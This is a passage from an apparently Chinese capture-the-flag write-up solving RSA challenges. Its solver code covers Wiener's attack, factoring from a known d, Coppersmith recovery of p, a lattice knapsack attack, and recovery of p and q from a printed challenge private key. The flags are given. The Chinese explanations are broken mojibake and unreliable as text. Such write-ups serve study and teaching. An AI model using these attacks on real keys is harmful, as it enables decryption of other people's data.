class="line">    <span class="keyword">while</span> a * y != x:</span><br><span class="line">        x, y = y, x - a * y</span><br><span class="line">        a = x // y</span><br><span class="line">        pquotients.append(a)</span><br><span class="line">    <span class="keyword">return</span> pquotients</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convergents_from_contfrac</span>(<span class="params">frac</span>):</span><br><span class="line">    <span class="comment"># computes the list of convergents using the list of partial quotients</span></span><br><span class="line">    convs = [];</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(frac)): convs.append(contfrac_to_rational(frac[<span class="number">0</span> : i]))</span><br><span class="line">    <span class="keyword">return</span> convs</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">contfrac_to_rational</span> (frac):</span><br><span class="line">    <span class="comment"># Converts a finite continued fraction [a0, ..., an] to an x/y rational.</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(frac) == <span class="number">0</span>: <span class="keyword">return</span> (<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">    num = frac[-<span class="number">1</span>]</span><br><span class="line">    denom = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">2</span>, -<span class="built_in">len</span>(frac) - <span class="number">1</span>, -<span class="number">1</span>): num, denom = frac[_] * num + denom, num</span><br><span class="line">    <span class="keyword">return</span> (num, denom)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>: <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    g, x, y = egcd(b % a, a)</span><br><span class="line">    <span class="keyword">return</span> (g, y - (b // a) * x, x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mod_inv</span>(<span class="params">a, m</span>):</span><br><span class="line">    g, x, _ = egcd(a, m)</span><br><span class="line">    <span class="keyword">return</span> (x + m) % m</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isqrt</span>(<span class="params">n</span>):</span><br><span class="line">    x = n</span><br><span class="line">    y = (x + <span class="number">1</span>) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> y &lt; x:</span><br><span class="line">        x = y</span><br><span class="line">        y = (x + n // x) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_rsa</span>(<span class="params">e, n</span>):</span><br><span class="line">    frac = rational_to_contfrac(e, n)</span><br><span class="line">    convergents = convergents_from_contfrac(frac)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (k, d) <span class="keyword">in</span> convergents:</span><br><span class="line">        <span class="keyword">if</span> k != <span class="number">0</span> <span class="keyword">and</span> (e * d - <span class="number">1</span>) % k == <span class="number">0</span>:</span><br><span class="line">            phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line">            s = n - phi + <span class="number">1</span></span><br><span class="line">            <span class="comment"># check if x*x - s*x + n = 0 has integer roots</span></span><br><span class="line">            D = s * s - <span class="number">4</span> * n</span><br><span class="line">            <span class="keyword">if</span> D &gt;= <span class="number">0</span>:</span><br><span class="line">                sq = isqrt(D)</span><br><span class="line">                <span class="keyword">if</span> sq * sq == D <span class="keyword">and</span> (s + sq) % <span class="number">2</span> == <span class="number">0</span>: <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line">e = crack_rsa(d, n)</span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 13521</span></span><br></pre></td></tr></table></figure><p>å†å·²çŸ¥ $n,e,d$ æ±‚ $p,q$ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">divide_pq</span>(<span class="params">e, d, n</span>):</span><br><span class="line">    k = e*d - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        g = random.randint(<span class="number">2</span>, n-<span class="number">1</span>)</span><br><span class="line">        t = k</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">if</span> t % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            t //= <span class="number">2</span></span><br><span class="line">            x = <span class="built_in">pow</span>(g, t, n)</span><br><span class="line">            <span class="keyword">if</span> x &gt; <span class="number">1</span> <span class="keyword">and</span> gmpy2.gcd(x-<span class="number">1</span>, n) &gt; <span class="number">1</span>:</span><br><span class="line">                p = gmpy2.gcd(x-<span class="number">1</span>, n)</span><br><span class="line">                <span class="keyword">return</span> (p, n//p)</span><br><span class="line"></span><br><span class="line">n = <span class="number">80642592772746398646558097588687958541171131704233319344980232942965050635113860017117519166348100569115174644678997805783380130114530824798808098237628247236574959152847903491509751809336988273823686988619679739640305091291330211169194377552925908412183162787327977125388852329089751737463948165202565859373</span></span><br><span class="line">d = <span class="number">14218766449983537783699024084862960813708451888387858392014856544340557703876299258990323621963898510226357248200187173211121827541826897886277531706124228848229095880229718049075745233893843373402201077890407507625110061976931591596708901741146750809962128820611844426759462132623616118530705745098783140913</span></span><br><span class="line">e = <span class="number">13521</span></span><br><span class="line"></span><br><span class="line">p, q = divide_pq(e, d, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Flag: DASCTF&#123;%s&#125;&quot;</span> %md5(<span class="built_in">str</span>(p + q).encode()).hexdigest())</span><br><span class="line"></span><br><span class="line"><span class="comment"># Flag: DASCTF&#123;4ae33bea90f030bfddb7ac4d9222ef8f&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="MCeorpkpleer"><a href="#MCeorpkpleer" class="headerlink" title="MCeorpkpleer"></a>MCeorpkpleer</h3><blockquote><p>è¿™æ•°æ®éƒ½ä¸å…¨è¦æ€ä¹ˆè®¡ç®—å‘¢</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pubkey</span>(<span class="params"><span class="built_in">list</span>, m, w</span>):</span><br><span class="line">    pubkey_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(e_bin)):</span><br><span class="line">        pubkey_list.append(w * <span class="built_in">list</span>[i] % m)</span><br><span class="line">    <span class="keyword">return</span> pubkey_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">e_cry</span>(<span class="params">e, pubkey</span>):</span><br><span class="line">    pubkey_list = pubkey</span><br><span class="line">    encode = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(e)):</span><br><span class="line">        encode += pubkey_list[i] * <span class="built_in">int</span>(e[i]) % m</span><br><span class="line">    <span class="keyword">return</span> encode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = getPrime(<span class="number">64</span>)</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line">e_bin = (<span class="built_in">bin</span>(e))[<span class="number">2</span>:]</span><br><span class="line"><span class="built_in">list</span> = [<span class="built_in">pow</span>(<span class="number">3</span>, i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(e_bin))]</span><br><span class="line">m = getPrime(<span class="built_in">len</span>(<span class="built_in">bin</span>(<span class="built_in">sum</span>(<span class="built_in">list</span>))) - <span class="number">1</span>)</span><br><span class="line">w = getPrime(<span class="number">64</span>)</span><br><span class="line">pubkey = pubkey(<span class="built_in">list</span>, m, w)</span><br><span class="line">en_e = e_cry(e_bin, pubkey)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p = &#123;&#125;\n&#x27;</span></span><br><span class="line">      <span class="string">&#x27;n = &#123;&#125;\n&#x27;</span></span><br><span class="line">      <span class="string">&#x27;c = &#123;&#125;\n&#x27;</span></span><br><span class="line">      <span class="string">&#x27;pubkey = &#123;&#125;\n&#x27;</span></span><br><span class="line">      <span class="string">&#x27;en_e = &#123;&#125;&#x27;</span>.<span class="built_in">format</span>((p &gt;&gt; <span class="number">435</span>) &lt;&lt; <span class="number">435</span>, n, c, pubkey, en_e))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p = 139540788452365306201344680691061363403552933527922544113532931871057569249632300961012384092481349965600565669315386312075890938848151802133991344036696488204791984307057923179655351110456639347861739783538289295071556484465877192913103980697449775104351723521120185802327587352171892429135110880845830815744</span></span><br><span class="line"><span class="string">n = 22687275367292715121023165106670108853938361902298846206862771935407158965874027802803638281495587478289987884478175402963651345721058971675312390474130344896656045501040131613951749912121302307319667377206302623735461295814304029815569792081676250351680394603150988291840152045153821466137945680377288968814340125983972875343193067740301088120701811835603840224481300390881804176310419837493233326574694092344562954466888826931087463507145512465506577802975542167456635224555763956520133324723112741833090389521889638959417580386320644108693480886579608925996338215190459826993010122431767343984393826487197759618771</span></span><br><span class="line"><span class="string">c = 156879727064293983713540449709354153986555741467040286464656817265584766312996642691830194777204718013294370729900795379967954637233360644687807499775502507899321601376211142933572536311131955278039722631021587570212889988642265055045777870448827343999745781892044969377246509539272350727171791700388478710290244365826497917791913803035343900620641430005143841479362493138179077146820182826098057144121231954895739989984846588790277051812053349488382941698352320246217038444944941841831556417341663611407424355426767987304941762716818718024107781873815837487744195004393262412593608463400216124753724777502286239464</span></span><br><span class="line"><span class="string">pubkey = [18143710780782459577, 54431132342347378731, 163293397027042136193, 489880191081126408579, 1469640573243379225737, 4408921719730137677211, 13226765159190413031633, 39680295477571239094899, 119040886432713717284697, 357122659298141151854091, 1071367977894423455562273, 3214103933683270366686819, 9642311801049811100060457, 28926935403149433300181371, 86780806209448299900544113, 260342418628344899701632339, 781027255885034699104897017, 2343081767655104097314691051, 7029245302965312291944073153, 21087735908895936875832219459, 63263207726687810627496658377, 189789623180063431882489975131, 569368869540190295647469925393, 1708106608620570886942409776179, 601827224419797931380408071500, 1805481673259393794141224214500, 893952418336266652976851386463, 2681857255008799958930554159389, 3523079163584485147344841221130, 1524252287869625983140881149316, 50264262166963219975822190911, 150792786500889659927466572733, 452378359502668979782399718199, 1357135078508006939347199154597, 4071405235524020818041597463791, 3169230503688232995231149877299, 462706308180869526799807117823, 1388118924542608580399421353469, 4164356773627825741198264060407, 3448085117999647764701149667147, 1299270151115113835209806487367, 3897810453345341505629419462101, 2648446157152195057994615872229, 3422845870014670444537026359650, 1223552407160181874717436564876, 3670657221480545624152309694628, 1966986461557807413563286569810, 1378466783231507511243038452393, 4135400349694522533729115357179, 3361215846199738142293703557463, 1038662335715384967987468158315, 3115987007146154903962404474945, 302975818554635252993570910761, 908927455663905758980712732283, 2726782366991717276942138196849, 3657854499533237101379593333510, 1928578295715881845245137486456, 1263242285705730806288591202331, 3789726857117192418865773606993, 2324195368467747797703678306905, 2450093503961328663664213663678, 2827787910442071261545819733997, 3960871129884299055190637944954, 2837628186769067706678271320788]</span></span><br><span class="line"><span class="string">en_e = 31087054322877663244023458448558</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>æ ¹æ®å·²çŸ¥ $p$ é«˜ä½ï¼Œç”¨coppersmithç®—æ³•æ¢å¤ $p$ã€‚</p><p>å¯¹äº $e$ï¼Œå·²çŸ¥ $s_i = w \cdot 3^i \bmod m$ï¼Œå·²çŸ¥ $3^i$ å’Œ $s_i$ï¼ŒæœªçŸ¥ $w$ å’Œ $m$ã€‚</p><p>ç”± $\begin{cases} s_i = w \cdot 3^i \bmod m \newline s_{i+1} = w \cdot 3^{i+1} \bmod m \end{cases}$ï¼Œå³ $\begin{cases} w \cdot 3^i = s_i+k_1m \newline w \cdot 3^{i+1} = s_{i+1}+k_2m \end{cases}$ï¼Œ</p><p>ä¸¤å¼ç›¸é™¤ï¼Œå¾— $(3s_i-s_{i+1})=(3k_1-k_2)m=km$ï¼Œæ•…æ±‚gcdå¯å¾— $m$ï¼Œå†æŒ‰èƒŒåŒ…å¯†ç æ±‚è§£ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">ph = </span><br><span class="line">N = </span><br><span class="line">c = </span><br><span class="line">pk = [...]</span><br><span class="line">ec = </span><br><span class="line"></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(N))</span><br><span class="line">f = ph + x</span><br><span class="line">pl = f.small_roots(X=<span class="number">2</span>^<span class="number">435</span>, beta=<span class="number">0.4</span>)[<span class="number">0</span>]</span><br><span class="line">p = <span class="built_in">int</span>(ph+pl)</span><br><span class="line">q = N//p</span><br><span class="line"></span><br><span class="line">m = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(pk)-<span class="number">1</span>):</span><br><span class="line">    m = gcd(m, <span class="number">3</span>*pk[i]-pk[i+<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line">w = pk[<span class="number">0</span>]*inverse_mod(<span class="number">3</span>^<span class="number">0</span>,m)%m</span><br><span class="line"><span class="built_in">print</span>(w)</span><br><span class="line"></span><br><span class="line">ct =  ec</span><br><span class="line">n = <span class="built_in">len</span>(pk)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Sanity check for application of low density attack</span></span><br><span class="line">d = n / log(<span class="built_in">max</span>(pk), <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(CDF(d))</span><br><span class="line"><span class="keyword">assert</span> CDF(d) &lt; <span class="number">0.9408</span></span><br><span class="line"></span><br><span class="line">M = Matrix.identity(n) * <span class="number">2</span></span><br><span class="line"></span><br><span class="line">last_row = [<span class="number">1</span> <span class="keyword">for</span> x <span class="keyword">in</span> pk]</span><br><span class="line">M_last_row = Matrix(ZZ, <span class="number">1</span>, <span class="built_in">len</span>(last_row), last_row)</span><br><span class="line"></span><br><span class="line">last_col = pk</span><br><span class="line">last_col.append(ct)</span><br><span class="line">M_last_col = Matrix(ZZ, <span class="built_in">len</span>(last_col), <span class="number">1</span>, last_col)</span><br><span class="line"></span><br><span class="line">M = M.stack(M_last_row)</span><br><span class="line">M = M.augment(M_last_col)</span><br><span class="line"></span><br><span class="line">X = M.BKZ()</span><br><span class="line"></span><br><span class="line">sol = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n + <span class="number">1</span>):</span><br><span class="line">    testrow = X.row(i).<span class="built_in">list</span>()[:-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">set</span>(testrow).issubset([-<span class="number">1</span>, <span class="number">1</span>]):</span><br><span class="line">        <span class="keyword">for</span> v <span class="keyword">in</span> testrow:</span><br><span class="line">            <span class="keyword">if</span> v == <span class="number">1</span>:</span><br><span class="line">                sol.append(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">elif</span> v == -<span class="number">1</span>:</span><br><span class="line">                sol.append(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">s = sol</span><br><span class="line">e = <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">str</span>(k) <span class="keyword">for</span> k <span class="keyword">in</span> s]),<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line"><span class="built_in">print</span>(e.bit_length())</span><br><span class="line"><span class="built_in">print</span>(is_prime(e))</span><br><span class="line"></span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,N)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="string">b&#x27;DASCTF&#123;T81I_tPPS_6r7g_xlPi_OO3M_6vyV_Rkba&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="XORè´¯ç©¿å§‹ç»ˆ"><a href="#XORè´¯ç©¿å§‹ç»ˆ" class="headerlink" title="XORè´¯ç©¿å§‹ç»ˆ"></a>XORè´¯ç©¿å§‹ç»ˆ</h3><blockquote><p>ä¸€åˆ‡éƒ½æ˜¯æœ‰æ„ä¹‰çš„ï¼Œæ‹¿ä¸‹å®ƒå§ã€‚</p></blockquote><p><code>massege.txt</code> ä¸­ä¸ºç¤¾ä¼šä»·å€¼è§‚ç¼–ç ï¼Œè§£ç å¾—å‹ç¼©åŒ…å¯†ç ï¼š<code>C0ngr4tulati0n5_y0u_fou^d_m3</code>ï¼Œæ³¨é‡Šï¼š<code>é’¥åŒ™å…ˆåˆ«æ‰”æ‰ï¼Œä¸‡ä¸€åé¢è¿˜æœ‰ç”¨å‘¢</code>ã€‚</p><p><code>task.py</code>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> enflag</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = q * p</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">e = getPrime(<span class="number">17</span>)</span><br><span class="line"><span class="keyword">assert</span> gcd(e, phi) == <span class="number">1</span></span><br><span class="line"><span class="comment"># ä»¥ä¸Šä¿¡æ¯ç”Ÿæˆäº†ç§é’¥æ–‡ä»¶,ä½†æ–‡ä»¶è¢«æŸåäº†ä½ èƒ½æå–æœ‰ç”¨ä¿¡æ¯å—</span></span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(enflag, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c = &#x27;</span> + <span class="built_in">str</span>(c))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">c = 91817924748361493215143897386603397612753451291462468066632608541316135642691873237492166541761504834463859351830616117238028454453831120079998631107520871612398404926417683282285787231775479511469825932022611941912754602165499500350038397852503264709127650106856760043956604644700201911063515109074933378818</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><code>pri.pem</code>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN PRIVATE KEY-----</span><br><span class="line">MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBALmtMy+2uH1ZtbIL</span><br><span class="line">SuiAukFthyQRH5mp7UmLyzZQkdg9zEP9/5tgffikQ7ytx5kHySHnazgAO1sOzmYE</span><br><span class="line">N4Axlev6uafiP8B1Eij97v5VkYJ1I9e3mtBNheTbXKoT8op+ASQ1fQaF4A8UzLuW</span><br><span class="line">eZeZI8JTH/SH+bolAK3kiZXDFdkTAgMBAAECgYEAl067LaC7Cvs2A5cMPhfYsESv</span><br><span class="line">IgcKN1CwW4Sd3u8dSphhgu7TgyzIuvwxbuo2g1BC6WwKhaI6vGN+csfw6nh98GEn</span><br><span class="line">/p3D0huNroAYvf/DRRB9UnHdttX7wB+Mv3P0RBDWHgBiCDVvHFuFUV78cIs0tnbn</span><br><span class="line">jxjU07aPV2XRC3AfA2ECQQDqWUNPVg3i6vTyHCL7EGkbeUheYpAAfcKCQrxjc5+5</span><br><span class="line">X6A+XtgHAA1JHwykPlCpHUOmlA85DJF1ejuoImzlgRLJAkEAytTCnQF+MN2r1gaA</span><br><span class="line">UETZyj5qMYT7Th8zKEVVVJjDawLnuX4usJ2FyRnjCkk86U75QSJhw5mMc0QnG25u</span><br><span class="line">Gz3++w==</span><br><span class="line">-----END PRIVATE KEY-----</span><br></pre></td></tr></table></figure><p>æŒ‰ç…§ç§é’¥ç»“æ„ï¼Œå°†ç§é’¥base64è§£ç è½¬hexåˆ†æï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">30820277</span> <span class="comment"># å¤šä½™éƒ¨åˆ†</span></span><br><span class="line"></span><br><span class="line">0201 <span class="comment"># å¤šä½™éƒ¨åˆ†</span></span><br><span class="line"><span class="number">00</span></span><br><span class="line"></span><br><span class="line">300d06092a864886f70d01010105000482 <span class="comment"># å¤šä½™éƒ¨åˆ†</span></span><br><span class="line">0261</span><br><span class="line"></span><br><span class="line">3082025d <span class="comment"># å¼€å§‹: é•¿åº¦=0x025d</span></span><br><span class="line"></span><br><span class="line">0201 <span class="comment"># ç‰ˆæœ¬ï¼šé•¿åº¦=0x01</span></span><br><span class="line"><span class="number">00</span></span><br><span class="line"></span><br><span class="line">028181 <span class="comment"># nï¼šé•¿åº¦=0x81</span></span><br><span class="line">00b9ad332fb6b87d59b5b20b4ae880ba416d8724111f99a9ed498bcb365091d83dcc43fdff9b607df8a443bcadc79907c921e76b38003b5b0ece660437803195ebfab9a7e23fc0751228fdeefe5591827523d7b79ad04d85e4db5caa13f28a7e0124357d0685e00f14ccbb9679979923c2531ff487f9ba2500ade48995c315d913 <span class="comment"># n</span></span><br><span class="line"></span><br><span class="line">0203 <span class="comment"># eï¼šé•¿åº¦=0x03</span></span><br><span class="line"><span class="number">0</span>10001 <span class="comment"># e</span></span><br><span class="line"></span><br><span class="line">028181 <span class="comment"># dï¼šé•¿åº¦=0x81</span></span><br><span class="line">00974ebb2da0bb0afb3603970c3e17d8b044af22070a3750b05b849ddeef1d4a986182eed3832cc8bafc316eea36835042e96c0a85a23abc637e72c7f0ea787df06127fe9dc3d21b8dae8018bdffc345107d5271ddb6d5fbc01f8cbf73f44410d61e006208356f1c5b85515efc708b34b676e78f18d4d3b68f5765d10b701f0361 <span class="comment"># d</span></span><br><span class="line"></span><br><span class="line">0241 <span class="comment"># pï¼šé•¿åº¦=0x41</span></span><br><span class="line">00ea59434f560de2eaf4f21c22fb10691b79485e6290007dc28242bc63739fb95fa03e5ed807000d491f0ca43e50a91d43a6940f390c91757a3ba8226ce58112c9 <span class="comment"># p</span></span><br><span class="line"></span><br><span class="line">0241 <span class="comment"># qï¼šé•¿åº¦=0x41</span></span><br><span class="line">00cad4c29d017e30ddabd606805044d9ca3e6a3184fb4e1f332845555498c36b02e7b97e2eb09d85c919e30a493ce94ef9412261c3998c7344271b6e6e1b3dfefb <span class="comment"># q</span></span><br></pre></td></tr></table></figure><p>è§£RSAï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="number">91817924748361493215143897386603397612753451291462468066632608541316135642691873237492166541761504834463859351830616117238028454453831120079998631107520871612398404926417683282285787231775479511469825932022611941912754602165499500350038397852503264709127650106856760043956604644700201911063515109074933378818</span></span><br><span class="line">p = <span class="number">0x00ea59434f560de2eaf4f21c22fb10691b79485e6290007dc28242bc63739fb95fa03e5ed807000d491f0ca43e50a91d43a6940f390c91757a3ba8226ce58112c9</span></span><br><span class="line">q = <span class="number">0x00cad4c29d017e30ddabd606805044d9ca3e6a3184fb4e1f332845555498c36b02e7b97e2eb09d85c919e30a493ce94ef9412261c3998c7344271b6e6e1b3dfefb</span></span><br><span class="line">n = <span class="number">0xb9ad332fb6b87d59b5b20b4ae880ba416d8724111f99a9ed498bcb365091d83dcc43fdff9b607df8a443bcadc79907c921e76b38003b5b0ece660437803195ebfab9a7e23fc0751228fdeefe5591827523d7b79ad04d85e4db5caa13f28a7e0124357d0685e00f14ccbb9679979923c2531ff487f9ba2500ade48995c315d913</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"><span class="built_in">print</span>(is_prime(p))</span><br><span class="line"><span class="built_in">print</span>(is_prime(q))</span><br><span class="line"></span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = <span 